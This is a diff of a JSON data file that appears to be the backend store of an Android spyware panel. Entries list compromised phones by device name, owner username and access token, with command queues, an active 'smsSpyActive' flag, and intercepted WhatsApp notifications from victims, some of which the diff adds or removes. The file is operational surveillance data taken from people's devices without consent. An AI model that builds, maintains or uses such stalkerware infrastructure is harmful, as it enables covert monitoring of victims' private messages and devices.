@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776777232246,
+    "lastSeen": 1776777236347,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Saluran • Zrylx",
+        "content": "🎉 Saluran Anda memiliki 1 pengikut",
+        "time": "21/04 20:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776777237956
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -10320,14 +10328,6 @@
         "time": "21/04 19:40",
         "pkg": "com.whatsapp",
         "receivedAt": 1776775215860
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (217 pesan): ~ 𝐗𝐅𝐙 | 𝐅ɑׁׅη𝟕𝐒ꫀׁׅܻ݊χ",
-        "content": "💟 Stiker",
-        "time": "21/04 19:40",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776775215600
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776777232539,
+    "lastSeen": 1776777235505,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776777229861,
+    "lastSeen": 1776777235861,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
